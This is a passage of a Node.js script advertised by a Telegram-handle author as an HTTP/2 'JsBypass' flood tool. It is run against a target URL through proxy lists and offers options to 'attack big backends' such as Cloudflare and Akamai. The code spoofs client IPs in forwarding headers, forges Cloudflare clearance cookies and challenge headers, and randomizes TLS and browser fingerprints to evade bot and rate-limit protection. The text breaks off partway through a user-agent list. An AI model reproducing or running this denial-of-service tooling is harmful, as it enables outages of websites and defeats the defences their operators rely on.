/*


               Developer & create script by:
                       t.me/zentra999
                       t.me/zentra999
               New version: 18/01/26


*/


const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

process.env.UV_THREADPOOL_SIZE = os.cpus().length * 64; 

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let statuses = {};
let proxyConnections = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;

const timestamp = Date.now();
const startTime = Date.now(); // Start time for countdown
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 2 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug');
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const authProxyFlag = process.argv.includes('--auth');
const closeIndex = process.argv.indexOf('--close');
const closeOnError = closeIndex !== -1;



// new logic by villan
const ratelimitBypassIndex = process.argv.indexOf('--ratelimit-bypass');
const enableRatelimitBypass = ratelimitBypassIndex !== -1;
const redirectBypassIndex = process.argv.indexOf('--redirect-bypass');
const enableRedirectBypass = redirectBypassIndex !== -1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`
      Contact: t.me/zentra999             - JsBypass Script Update: 20/01/26
                     t.me/zentra999

     Usage:
        node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
     Example:
        node ${process.argv} GET https://target.com/ 120 16 90 proxy.txt --debug --full --connect --close --ratelimit-bypass
     Options:
      --randpath 1/2/3 - Query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwfwfw
      --cache - Enable cache bypass techniques
      --debug - Show status codes
      --full - Attack for big backends (Amazon, Akamai, Cloudflare)
      --delay <1-50> - Delay between requests 1-50 ms
      --connect - Keep proxy connection
      --cookie "f=f" - Custom cookie, supports %RAND% ex: "jsbypass=%RAND%"
      --bfm true/null - Enable bypass bot fight mode
      --referer https://target.com / rand - Custom referer or random domain
      --postdata "username=admin&password=123" - POST data, format "username=f&password=f"
      --authorization <type>:<value> - Authorization header, ex: "Bearer:abc123" (supports %RAND%)
      --randrate - Randomizer rate 1 to 90 for bypass
      --header "name:value#name2:value2" - Custom headers
      --fakebot true/false - Use bot User-Agent (TelegramBot, GPTBot, GoogleBot, etc.)
      --auth - Use proxies authorization (format ip:port:username:password)
      --close - Close connections on 403/429
      --ratelimit-bypass - Enable rate limit bypass techniques 
      --redirect-bypass - Enable redirect handling and backoff strategies

    `);
    process.exit(1);
}
if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
    const parts = line.split(':');
    if (authProxyFlag) {
        return parts.length === 4 && !isNaN(parts[1]);
    } else {
        return parts.length === 2 && !isNaN(parts[1]);
    }
});

if (proxy.length === 0) {
    console.error('No valid proxy');
    process.exit(1);
}

const backoffStrategies = {
    async fixed(attempt) { await sleep(1000); },
    async linear(attempt) { await sleep(1000 * attempt); },
    async exponential(attempt) { await sleep(Math.min(10000, 500 * Math.pow(2, attempt))); },
    async exponentialJitter(attempt) { await sleep(Math.min(10000, 500 * Math.pow(2, attempt) * (0.5 + Math.random() * 0.5))); },
    async fibonacci(attempt) {
        let [a, b] = [0, 1];
        for (let i = 0; i < attempt; i++) [a, b] = [b, a + b];
        await sleep(Math.min(10000, 1000 * b));
    },
    async polynomial(attempt) { await sleep(Math.min(10000, 500 * Math.pow(attempt, 2))); },
    async retryAfter(attempt, retryAfter) { await sleep(retryAfter || 1000); }
};

const backoffConfig = {
    on429: ["fixed", "linear", "exponential", "exponentialJitter", "fibonacci", "polynomial", "retryAfter"],
    onRedirect: "fixed",
    onGoaway: "exponentialJitter"
};

async function applyBackoff(strategy, attempt, retryAfter = null) {
    if (Array.isArray(strategy)) {
        const selectedStrategy = strategy[Math.floor(Math.random() * strategy.length)];
        await backoffStrategies[selectedStrategy](attempt, retryAfter);
    } else {
        await backoffStrategies[strategy](attempt, retryAfter);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


let rateLimitMap = [];
const cleanupRateLimitMap = () => {
    const currentTime = Date.now();
    rateLimitMap = rateLimitMap.filter(limit => currentTime - limit.timestamp <= 60000);
};


function checkRateLimit(proxyHost) {
    cleanupRateLimitMap();
    return rateLimitMap.some(limit => limit.proxy === proxyHost && (Date.now() - limit.timestamp) < 60000);
}


function markRateLimited(proxyHost) {
    rateLimitMap.push({ proxy: proxyHost, timestamp: Date.now() });
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    if (streamId === 0) {
      return Buffer.alloc(0);
    }
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Dynamic IP generation - use generateUniqueIP() for better rotation

// UPGRADED: Advanced IP Spoofing with better legitimacy
function generateLegitIP() {
    const ipPools = {
        
        tier1: [
            { prefix: '8.8.8.', range: [1, 254], weight: 15 },       
            { prefix: '8.8.4.', range: [1, 254], weight: 15 },      
            { prefix: '1.1.1.', range: [1, 254], weight: 12 },       
            { prefix: '1.0.0.', range: [1, 254], weight: 12 },       
            { prefix: '172.217.', range: [1, 254], weight: 10 },     
            { prefix: '172.253.', range: [1, 254], weight: 10 },     
        ],
       
        tier2: [
            { prefix: '203.0.113.', range: [1, 254], weight: 5 },    
            { prefix: '198.51.100.', range: [1, 254], weight: 5 },   
            { prefix: '192.0.2.', range: [1, 254], weight: 5 },      
            { prefix: '151.101.', range: [0, 255], weight: 6 },      
            { prefix: '185.199.', range: [108, 111], weight: 6 },    
            { prefix: '13.107.', range: [42, 43], weight: 5 },       
            { prefix: '20.190.', range: [151, 154], weight: 5 },     
            { prefix: '52.96.', range: [0, 255], weight: 5 },       
            { prefix: '54.239.', range: [0, 255], weight: 5 },       
            { prefix: '34.102.', range: [136, 143], weight: 5 }      
        ],
        
        tier3: [
            { prefix: '185.220.', range: [100, 103], weight: 3 },    // Tor exit nodes
            { prefix: '45.142.', range: [120, 127], weight: 3 },     // Various hosting
            { prefix: '95.214.', range: [224, 255], weight: 3 },     // European ISP
            { prefix: '138.199.', range: [0, 63], weight: 3 },       // Various
            
        ]
    };

    
    const tierRoll = Math.random() * 100;
    let selectedTier;

    if (tierRoll < 70) {
        selectedTier = ipPools.tier1;
    } else if (tierRoll < 95) {
        selectedTier = ipPools.tier2;
    } else {
        selectedTier = ipPools.tier3;
    }

   
    const totalWeight = selectedTier.reduce((sum, subnet) => sum + subnet.weight, 0);
    let weightRoll = Math.random() * totalWeight;
    let selectedSubnet;

    for (const subnet of selectedTier) {
        weightRoll -= subnet.weight;
        if (weightRoll <= 0) {
            selectedSubnet = subnet;
            break;
        }
    }

    
    const lastOctet = selectedSubnet.range[0] + 
        Math.floor(Math.random() * (selectedSubnet.range[1] - selectedSubnet.range[0] + 1));

    return selectedSubnet.prefix + lastOctet;
}

const ipRotationCache = {
    ips: [],
    maxSize: 50,
    lastCleanup: Date.now(),

    add(ip) {
        if (this.ips.length >= this.maxSize) {
            this.ips.shift();
        }
        this.ips.push(ip);
    },

    isRecent(ip) {
        return this.ips.includes(ip);
    },

    cleanup() {
        const now = Date.now();
        if (now - this.lastCleanup > 60000) { // Clean every 60s
            this.ips = [];
            this.lastCleanup = now;
        }
    }
};


// skibidi new update 
function generateUniqueIP() {
    ipRotationCache.cleanup();
    let ip;
    let attempts = 0;

    do {
        ip = generateLegitIP();
        attempts++;
    } while (ipRotationCache.isRecent(ip) && attempts < 10);

    ipRotationCache.add(ip);
    return ip;
}

const alternativeIPHeaders = [
    ["cdn-loop", () => `${generateUniqueIP()}:${randstr(5)}`],
    ["true-client-ip", generateUniqueIP],
    ["via", () => `1.1 ${generateUniqueIP()}`],
    ["request-context", () => `appId=${randstr(8)};ip=${generateUniqueIP()}`],
    ["x-edge-ip", generateUniqueIP],
    ["x-coming-from", generateUniqueIP],
    ["akamai-client-ip", generateUniqueIP]
];

function generateAlternativeIPHeaders() {
    const headers = [];
    for (let i = 0; i < alternativeIPHeaders.length; i++) {
        if (Math.random() < 0.5) {
            const [key, valueFunc] = alternativeIPHeaders[i];
            headers.push([key, typeof valueFunc === 'function' ? valueFunc() : valueFunc]);
        }
    }
    
    if (headers.length === 0) {
        headers.push(["cdn-loop", `${generateUniqueIP()}:${randstr(5)}`]);
    }
    
    return headers;
}

// skibidi update 
const headerOrder = [
  'user-agent',
  'accept',
  'sec-ch-ua',
  'sec-ch-ua-mobile',
  'sec-ch-ua-platform',
  'sec-ch-ua-platform-version', 
  'sec-ch-ua-full-version-list', 
  'sec-ch-ua-model', 
  'sec-ch-ua-arch',
  'sec-ch-ua-bitness',
  'sec-ch-viewport-width',
  'sec-ch-device-memory',
  'sec-ch-prefers-color-scheme', 
  'accept-language',
  'accept-encoding',
  'sec-fetch-site',
  'sec-fetch-mode',
  'sec-fetch-dest',
  'sec-fetch-user',
  'upgrade-insecure-requests'
];

const platforms = ['Windows', 'macOS', 'Linux'];
const architectures = ['x86', 'arm', 'arm64'];


const platformVersions = {
  'Windows': ['10.0.0', '15.0.0'],
  'macOS': ['13.0.0', '14.0.0', '14.1.0', '14.2.0'],
  'Linux': ['5.15.0', '6.1.0', '6.5.0']
};


const mobileModels = [
  'SM-S928B', 'SM-G998B', 'SM-A546B',
  'iPhone 15 Pro', 'iPhone 15', 'iPhone 14 Pro',
  'Pixel 8 Pro', 'Pixel 8', 'Pixel 7a'
];

const languages = [
  "en-US,en;q=0.9,vi;q=0.8",
  "en-US,en;q=0.9,es;q=0.8,fr;q=0.7",
  "en-GB,en;q=0.9,en-US;q=0.8",
  "de-DE,de;q=0.9,en;q=0.8,fr;q=0.7",
  "zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7",
  "ja-JP,ja;q=0.9,en;q=0.8,zh;q=0.7,ko;q=0.6",
  "fr-FR,fr;q=0.9,en;q=0.8",
  "es-ES,es;q=0.9,en;q=0.8"
];

// skibidi update bixd
function generateDynamicHeaders(fingerprint, isMobile, platform) {
  const dynamicHeaders = new Map();

  dynamicHeaders.set('user-agent', fingerprint.navigator.userAgent);
  dynamicHeaders.set('accept', Math.random() > 0.5
    ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    : 'text/html,application/xhtml+xml,*/*;q=0.9');

  dynamicHeaders.set('sec-ch-ua', fingerprint.navigator.sextoy);
  dynamicHeaders.set('sec-ch-ua-mobile', isMobile ? '?1' : '?0');
  dynamicHeaders.set('sec-ch-ua-platform', `"${platform}"`);


  const versions = platformVersions[platform];
  if (versions) {
    dynamicHeaders.set('sec-ch-ua-platform-version', `"${versions[Math.floor(Math.random() * versions.length)]}"`);
  }


  if (fingerprint.browserType === 'chrome' || fingerprint.browserType === 'edge') {
    const brandName = fingerprint.browserType === 'chrome' ? 'Google Chrome' : 'Microsoft Edge';
    dynamicHeaders.set('sec-ch-ua-full-version-list', 
      `"${brandName}";v="${fingerprint.fullVersion}", "Chromium";v="${fingerprint.fullVersion}", "Not?A_Brand";v="24.0.0.0"`);
  }


  if (isMobile) {
    dynamicHeaders.set('sec-ch-ua-model', `"${mobileModels[Math.floor(Math.random() * mobileModels.length)]}"`);
  }

  dynamicHeaders.set('sec-ch-ua-arch', `"${architectures[Math.floor(Math.random() * architectures.length)]}"`);
  dynamicHeaders.set('sec-ch-ua-bitness', Math.random() > 0.5 ? '"64"' : '"32"');
  dynamicHeaders.set('sec-ch-viewport-width', getRandomInt(800, 2560).toString());
  dynamicHeaders.set('sec-ch-device-memory', [4, 8, 16, 32][Math.floor(Math.random() * 4)].toString());


  dynamicHeaders.set('sec-ch-prefers-color-scheme', Math.random() > 0.6 ? 'dark' : 'light');

  dynamicHeaders.set('accept-language', fingerprint.navigator.language);
  dynamicHeaders.set('accept-encoding', 'gzip, deflate, br, zstd');

  const isNavigation = Math.random() > 0.5;
  if (isNavigation) {
    dynamicHeaders.set('sec-fetch-site', 'none');
    dynamicHeaders.set('sec-fetch-mode', 'navigate');
    dynamicHeaders.set('sec-fetch-dest', 'document');
    dynamicHeaders.set('sec-fetch-user', '?1');
  } else {
    dynamicHeaders.set('sec-fetch-site', 'same-origin');
    dynamicHeaders.set('sec-fetch-mode', 'cors');
    dynamicHeaders.set('sec-fetch-dest', 'empty');

  }

  dynamicHeaders.set('upgrade-insecure-requests', '1');


const baseOrder = [...headerOrder];
const swapCount = Math.floor(Math.random() * 2) + 1;
for (let i = 0; i < swapCount; i++) {
    const idx = Math.floor(Math.random() * (baseOrder.length - 2)) + 1;
        [baseOrder[idx], baseOrder[idx + 1]] = [baseOrder[idx + 1], baseOrder[idx]];
}
const optionalHeaders = ['sec-ch-ua-arch', 'sec-ch-viewport-width', 'sec-ch-device-memory', 'sec-ch-prefers-color-scheme'];
  const omitCount = Math.random() > 0.8 ? Math.floor(Math.random() * 2) + 1 : 0;
    const toOmit = omitCount > 0 ? shuffle([...optionalHeaders]).slice(0, omitCount) : [];
    const orderedHeaders = [];
      for (const key of baseOrder) {
          if (dynamicHeaders.has(key) && !toOmit.includes(key)) {
                orderedHeaders.push([key, dynamicHeaders.get(key)]);
                    }
                      }
                        
                          return orderedHeaders.concat(generateAlternativeIPHeaders());
                          }

function generateCfClearanceCookie(fingerprint) {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}`) 
        .digest('hex')
        .substring(0, 16);
    
    return `cf_clearance=${clientId}.${challengeId}-${version}.${timestamp}.${hashPart}`;
}

function generateChallengeHeaders(fingerprint) {
    const challengeToken = randstr(32);
    const challengeResponse = crypto
        .createHash('md5')
        .update(`${challengeToken}${fingerprint.canvas}${timestamp}`) 
        .digest('hex')
        .substring(0, 16);
    
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse]
    ];
}

function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
            const payload = Buffer.from(JSON.stringify({ sub: randstr(8), iat: Math.floor(Date.now() / 1000) })).toString('base64url');
            const signature = crypto.createHmac('sha256', randstr(16)).update(`${header}.${payload}`).digest('base64url');
            return `Bearer ${header}.${payload}.${signature}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(16))}`;
    } else if (type.toLowerCase() === 'basic') {
        const [username, password] = value.split(':');
        if (!username || !password) return null;
        const credentials = Buffer.from(`${username.replace('%RAND%', randstr(8))}:${password.replace('%RAND%', randstr(8))}`).toString('base64');
        return `Basic ${credentials}`;
    } else if (type.toLowerCase() === 'custom') {
        return value.replace('%RAND%', randstr(16));
    }
    return null;
}

function getRandomMethod() {
    const methods = ['POST', 'HEAD', 'GET', 'OPTION'];
    return methods[Math.floor(Math.random() * 3)];
}

const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];


const http2SettingsRanges = {

        HEADER_TABLE_SIZE: [4096, 16384],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [50, 100],
        INITIAL_WINDOW_SIZE: [65535, 262144],
        MAX_FRAME_SIZE: [16384, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 32768],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
};

function generateHTTP2Fingerprint() {
    const http2Settings = {};
    for (const [key, values] of Object.entries(http2SettingsRanges)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }
    return http2Settings;
}
const http2Fingerprint = generateHTTP2Fingerprint();

// update browserProfiles hihihi 2026
const browserProfiles = {
    'chrome': {
        ciphers: ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'],
        signatureAlgorithms: [
      'ecdsa_secp256r1_sha256',
      'rsa_pss_rsae_sha256',
      'rsa_pkcs1_sha256',
      'ecdsa_secp384r1_sha384',
      'rsa_pss_rsae_sha384',
      'rsa_pkcs1_sha384',
      'rsa_pss_rsae_sha512',
      'rsa_pkcs1_sha512',
      'ed25519',
      'ed448'
        ],
        curves: ['X25519', 'secp256r1', 'secp384r1', 'secp521r1'],
        extensions: ['0', '23', '65281', '10', '11', '35', '16', '5', '13', '18', '51', '45', '43', '27', '17513']
    },
    'firefox': {
        ciphers: ['TLS_AES_128_GCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'],
        signatureAlgorithms: [
      'ecdsa_secp256r1_sha256',
      'ecdsa_secp384r1_sha384',
      'ecdsa_secp521r1_sha512',
      'rsa_pss_rsae_sha256',
      'rsa_pss_rsae_sha384',
      'rsa_pss_rsae_sha512',
      'ed25519',
      'ed448'
        ],
        curves: ['X25519', 'secp256r1', 'secp384r1'],
        extensions: ['13', '51', '0', '45', '10', '11', '35', '16', '5', '43', '23', '65281', '18', '27', '17513']
    },
    'edge': {
        ciphers: ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384'],
        signatureAlgorithms: [
      'ecdsa_secp256r1_sha256',
      'rsa_pss_rsae_sha256',
      'rsa_pkcs1_sha256',
      'ecdsa_secp384r1_sha384',
      'rsa_pss_rsae_sha384',
      'ed25519'
        ],
        curves: ['X25519', 'secp256r1', 'secp384r1'],
        extensions: ['0', '5', '10', '11', '13', '16', '18', '23', '27', '35', '43', '45', '51', '17513', '65281']
    }
};


const desktopScreenSizes = [
    { width: 1920, height: 1080 },
    { width: 2560, height: 1440 },
    { width: 1366, height: 768 },
    { width: 3840, height: 2160 }
];

const mobileScreenSizes = [
    { width: 360, height: 640 },
    { width: 414, height: 896 },
    { width: 375, height: 812 },
    { width: 412, height: 915 },
    { width: 390, height: 844 }
];


const desktopWebGLVendors = [
    { vendor: 'Google Inc. (NVIDIA)', renderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 4060, Direct3D11 vs_5_0 ps_5_0)' },
    { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon RX 7600, Direct3D11 vs_5_0 ps_5_0)' },
    { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.6 (Core Profile) Mesa)' }
];

const mobileWebGLVendors = [
    { vendor: 'Google Inc. (Qualcomm)', renderer: 'ANGLE (Qualcomm, Adreno (TM) 660, OpenGL ES 3.2)' },
    { vendor: 'Google Inc. (ARM)', renderer: 'ANGLE (ARM, Mali-G78 MP14, OpenGL ES 3.2)' },
    { vendor: 'Google Inc. (Apple)', renderer: 'ANGLE (Apple, Apple A17 Pro GPU, OpenGL ES 3.0)' }
];

const botUserAgents = [
    'Cpanel-HTTP-Client/1.0',
    'TelegramBot (like TwitterBot)',
    'GPTBot/1.0 (+https://openai.com/gptbot)',
    'GPTBot/1.1 (+https://openai.com/gptbot)',
    'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
    'ChatGPT-User/1.0 (+https://openai.com/bot)',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
